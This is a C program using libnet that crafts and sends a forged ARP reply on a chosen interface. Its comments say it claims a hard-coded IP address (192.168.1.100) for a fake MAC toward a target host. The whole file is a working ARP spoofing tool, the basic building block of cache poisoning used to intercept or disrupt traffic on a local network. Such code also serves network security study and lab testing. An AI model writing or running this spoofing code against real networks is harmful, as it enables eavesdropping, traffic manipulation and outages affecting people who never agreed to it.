#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>

int main(int argc, char *argv[])
{
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l;
    libnet_ptag_t arp_tag, eth_tag;

    /*
     * We only accept the interface name as input.
     * Everything else is hard-coded.
     */
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    /*
     * Initialize libnet in LINK-layer mode.
     * This gives us full control over Ethernet frames.
     */
    l = libnet_init(LIBNET_LINK, argv[1], errbuf);
    if (!l) {
        fprintf(stderr, "libnet_init failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    /*
     * ===============================
     * MANUALLY DEFINED ADDRESSES
     * ===============================
     */

    /* Source MAC address (MAC we are claiming owns src_ip) */
    uint8_t src_mac[6] = {
        0x02, 0x11, 0x22, 0x33, 0x44, 0x55
    };

    /* Destination MAC (MAC of the device we are replying to) */
    uint8_t dst_mac[6] = {
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
    };

    /*
     * Source IP address.
     * This is the IP address we are pretending to be.
     */
    uint32_t src_ip = libnet_name2addr4(
        l,
        "192.168.1.100",
        LIBNET_RESOLVE
    );

    /*
     * Target IP address.
     * This is the IP address of the device we are replying to.
     */
    uint32_t target_ip = libnet_name2addr4(
        l,
        "192.168.1.15",
        LIBNET_RESOLVE
    );

    if (src_ip == (uint32_t)-1 || target_ip == (uint32_t)-1) {
        fprintf(stderr, "Invalid hard-coded IP address\n");
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    /*
     * Target MAC address.
     * This is the MAC of the device we are replying to.
     */
    uint8_t target_mac[6] = {
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
    };

    /*
     * ===============================
     * BUILD ARP HEADER (ARP REPLY)
     * ===============================
     */
    arp_tag = libnet_build_arp(
        ARPHRD_ETHER,        /* Ethernet hardware type */
        ETHERTYPE_IP,        /* IPv4 protocol type */
        6,                   /* MAC length */
        4,                   /* IPv4 length */
        ARPOP_REPLY,         /* ARP reply */
        src_mac,             /* Sender MAC (our MAC) */
        (uint8_t *)&src_ip,  /* Sender IP (IP we claim) */
        target_mac,          /* Target MAC (requester MAC) */
        (uint8_t *)&target_ip, /* Target IP (requester IP) */
        NULL,                /* No payload */
        0,
        l,
        0
    );

    if (arp_tag == -1) {
        fprintf(stderr, "Failed to build ARP: %s\n",
                libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    /*
     * ===============================
     * BUILD ETHERNET HEADER
     * ===============================
     */
    eth_tag = libnet_build_ethernet(
        dst_mac,        /* Destination MAC (requester) */
        src_mac,        /* Source MAC (our MAC) */
        ETHERTYPE_ARP,  /* EtherType */
        NULL,
        0,
        l,
        0
    );

    if (eth_tag == -1) {
        fprintf(stderr, "Failed to build Ethernet header: %s\n",
                libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    /*
     * ===============================
     * SEND PACKET
     * ===============================
     */
    if (libnet_write(l) == -1) {
        fprintf(stderr, "libnet_write failed: %s\n",
                libnet_geterror(l));
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    printf("Sent ARP reply:\n");
    printf("  Claimed IP : 192.168.1.100\n");
    printf("  Claimed MAC: 02:11:22:33:44:55\n");
    printf("  Target IP : 192.168.1.15\n");

    libnet_destroy(l);
    return 0;
}
